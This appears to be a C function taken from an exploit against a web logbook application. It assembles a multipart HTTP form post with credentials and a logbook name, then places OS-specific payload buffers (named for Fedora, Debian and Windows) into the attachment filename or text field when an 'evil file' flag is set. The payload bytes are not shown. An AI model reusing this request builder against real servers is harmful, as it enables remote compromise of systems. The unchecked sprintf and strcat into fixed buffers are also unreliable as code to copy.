
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


struct TYPE_4__ {char* addr; } ;
struct TYPE_3__ {char* addr; } ;


 char* LOGSUBJECT ;
 TYPE_2__* MISSED ;
 int MSGCONTENT ;
 int NOTUPLOADME ;
 int PRINTINFO (int ,int ) ;
 char* TESTPASS_DECODED ;
 char* TESTUSER ;
 TYPE_1__* TRASH ;
 int UPLOADME ;
 int base64_encode (char*,char*) ;
 char* bigbuffer ;
 char* boundary ;
 char* content ;
 size_t content_length ;
 char* debianbuffer ;
 int debug ;
 char* fedorabuf ;
 int id ;
 int is_there_attribute () ;
 char* make_random_boundary () ;
 char* shbuffer ;
 int sprintf (char*,char*,char*,...) ;
 int strcat (char*,char*) ;
 int strcpy (char*,char*) ;
 int strlen (char*) ;
 char* windozebuf ;
 char* windozetext ;
 char* wpassbufenc ;

char *make_http_content(int choice,char *logbookname)
 {
  char *pazzword = TESTPASS_DECODED;
  char passencode[50];
  char *text = ((void*)0);
  const char *experiment = logbookname;
  const char *att_file = shbuffer;
  const char *testuser = TESTUSER;
  const char *subject = LOGSUBJECT;
  char *l_content = content;
  int include_evilfile = 0;
  int attrcount = 0;
  int j;
                if(choice == UPLOADME)
                include_evilfile = 1;
                else if (choice == NOTUPLOADME)
                include_evilfile = 0;

     if(id == 4)
     att_file = fedorabuf;
     if((id == 5) || (id == 2))
     att_file = debianbuffer;
     if(id == 6){
     att_file = windozebuf;
     text = windozetext;
     }
     if(id != 6)
     text = bigbuffer;
     sprintf(boundary,"%s",make_random_boundary());

     PRINTINFO(MSGCONTENT,debug);

     base64_encode(pazzword,passencode);


  strcpy(content,boundary);

  strcat(content, "\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nSubmit\r\n");

  sprintf(content + strlen(content),
          "%s\r\nContent-Disposition: form-data; name=\"wpwd\"\r\n\r\n%s\r\n",boundary,wpassbufenc);

  sprintf(content + strlen(content),
          "%s\r\nContent-Disposition: form-data; name=\"unm\"\r\n\r\n%s\r\n",boundary,testuser);


  sprintf(content + strlen(content),
          "%s\r\nContent-Disposition: form-data; name=\"upwd\"\r\n\r\n%s\r\n", boundary, passencode);

  sprintf(content + strlen(content),
          "%s\r\nContent-Disposition: form-data; name=\"exp\"\r\n\r\n%s\r\n", boundary, experiment);


    if((attrcount = is_there_attribute())) {
      for( j = 0; j < attrcount ; j++) {

  sprintf(content + strlen(content),
          "%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n",
           boundary,MISSED[j].addr,TRASH[j].addr);
         }
      }

  sprintf(content + strlen(content),
          "%s\r\nContent-Disposition: form-data; name=\"Subject\"\r\n\r\n%s\r\n", boundary, subject);


  sprintf(content + strlen(content),
          "%s\r\nContent-Disposition: form-data; name=\"Text\"\r\n\r\n%s\r\n", boundary, text);

   if(include_evilfile){

  sprintf(content + strlen(content),
          "%s\r\nContent-Disposition: form-data; name=\"attfile\";filename=\"%s\"\r\n", boundary, att_file);
  }

  sprintf(content + strlen(content),"%s\r\n", boundary);


                   content_length = strlen(content);
                   content[content_length] = '\0';
                   return(l_content);
}
